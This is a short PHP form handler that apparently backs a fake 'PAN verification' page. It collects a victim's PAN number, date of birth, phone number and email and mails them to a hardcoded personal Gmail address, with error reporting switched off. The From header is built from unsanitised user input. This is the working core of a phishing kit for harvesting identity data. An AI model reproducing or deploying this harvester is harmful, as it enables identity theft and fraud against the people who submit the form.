<?php 
error_reporting(false);

if (isset($_POST['submit'])) {
   $pan = $_POST['pan'];
   $date = $_POST['dob'];
   $number = $_POST['mobile'];
   $email = $_POST['email'];
   $subject = "Pan Verification For: ".$email;
   $message = "Pan Number: ".$pan."<br>Date Of Birth: ".$date."<br>Phone Number: ".$number."<br>Email ID: ".$email;
   $headers = "From: <'$email'>";
   $mail = mail("camayuraggarwal99@gmail.com", $subject, $message, $headers);
}

?>